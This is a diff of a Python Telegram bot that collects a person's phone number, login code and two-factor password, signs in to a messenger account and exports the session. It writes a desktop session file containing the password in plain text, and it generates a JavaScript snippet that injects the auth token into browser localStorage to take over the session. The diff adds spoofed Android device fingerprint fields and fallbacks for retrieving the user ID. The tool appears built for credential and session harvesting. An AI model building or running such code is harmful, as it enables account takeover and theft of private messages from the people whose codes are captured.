@@ -43,31 +43,40 @@ def get_device_id_from_session(work_dir):
     return ""
 
 def build_desktop_json(token, device_id, password, user_id, phone):
-    data = {
+    return {
         "token": token,
         "deviceType": "ANDROID",
         "appVersion": "26.15.1",
         "osVersion": "Android 11",
         "timezone": "Asia/Novosibirsk",
+        "release": 1,
+        "screen": "420dpi 420dpi 1080x2400",
+        "pushDeviceType": "GCM",
+        "arch": "x86_64",
+        "locale": "ru",
+        "buildNumber": 6690,
+        "deviceName": "Redmi M2101K6G",
+        "deviceLocale": "ru",
         "deviceId": device_id.replace('-', '')[:16],
-        "clientSessionId": 1,
+        "clientSessionId": int(time.time() * 1000),
         "user": {
             "user_id": user_id,
             "phone": int(phone.replace("+", "")),
-        }
+            "photo_id": None,
+            "first_name": "",
+            "last_name": ""
+        },
+        "password": password if password else None
     }
-    if password:
-        data["password"] = password
-    return data
 
 def generate_web_js(device_id, token, viewer_id):
-    # ТОЧНО как в рабочем примере — без password
+    # ТОЧНО как в рабочем примере — без пробелов
     auth = {"token": token, "viewerId": viewer_id}
-    auth_str = json.dumps(auth, ensure_ascii=False)
+    auth_str = json.dumps(auth, ensure_ascii=False, separators=(',', ':'))
     return f"""sessionStorage.clear();
 localStorage.clear();
-localStorage.setItem('__oneme_device_id', '{device_id}');
-localStorage.setItem('__oneme_auth', JSON.stringify({auth_str}));
+localStorage.setItem('__oneme_device_id','{device_id}');
+localStorage.setItem('__oneme_auth','{auth_str}');
 window.location.reload();"""
 
 @dp.message(F.text == "/start")
@@ -98,6 +107,12 @@ async def phone_handler(message: types.Message, state: FSMContext):
             if uid in pending:
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
+                if not pending[uid]["user_id"] and client.me:
+                    try:
+                        me_dict = client.me.model_dump() if hasattr(client.me, 'model_dump') else client.me.dict()
+                        pending[uid]["user_id"] = me_dict.get('contact', {}).get('id', 0)
+                    except:
+                        pass
                 pending[uid]["status"] = "done"
         except Exception as e:
             err = str(e).lower()
@@ -149,11 +164,11 @@ async def code_handler(message: types.Message, state: FSMContext):
 
         if status == "done":
             token = pending[uid]["token"]
-            vid = pending[uid]["user_id"]
+            vid = pending[uid].get("user_id", 0)
             dev = get_device_id_from_session(work_dir)
 
-            if not dev:
-                await msg.edit_text("❌ Не удалось получить device_id.")
+            if not dev or not vid:
+                await msg.edit_text("❌ Не удалось получить данные.")
                 del pending[uid]; await state.clear(); return
 
             desktop = build_desktop_json(token, dev, "", vid, phone)
@@ -203,6 +218,16 @@ async def password_handler(message: types.Message, state: FSMContext):
     await asyncio.sleep(5)
 
     dev = get_device_id_from_session(work_dir)
+    vid = pending[uid].get("user_id", 0)
+
+    if not vid:
+        client = pending[uid].get("client")
+        if client and client.me:
+            try:
+                me_dict = client.me.model_dump() if hasattr(client.me, 'model_dump') else client.me.dict()
+                vid = me_dict.get('contact', {}).get('id', 0)
+                pending[uid]["user_id"] = vid
+            except: pass
 
     db_path = os.path.join(work_dir, "session.db")
     token = None
@@ -219,16 +244,14 @@ async def password_handler(message: types.Message, state: FSMContext):
             conn.close()
         except: pass
 
-    if pending[uid].get("status") == "done" and dev:
+    if pending[uid].get("status") == "done" and dev and vid:
         token = token or pending[uid].get("token", "")
-        vid = pending[uid].get("user_id") or 0
 
         desktop = build_desktop_json(token, dev, pwd, vid, phone)
         dp_path = f"{work_dir}/desktop_session.txt"
         with open(dp_path, "w") as f:
             json.dump(desktop, f, ensure_ascii=False, indent=4)
 
-        # Веб-токен БЕЗ пароля
         js = generate_web_js(dev, token, vid)
         wp = f"{work_dir}/web_token.txt"
         with open(wp, "w") as f:
@@ -239,8 +262,8 @@ async def password_handler(message: types.Message, state: FSMContext):
         await msg.edit_text("✅ Готово! Токены отправлены.")
         del pending[uid]; await state.clear(); return
 
-    elif not dev:
-        await msg.edit_text("❌ Не удалось получить device_id.")
+    elif not dev or not vid:
+        await msg.edit_text("❌ Не удалось получить данные.")
         del pending[uid]; await state.clear()
     else:
         await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
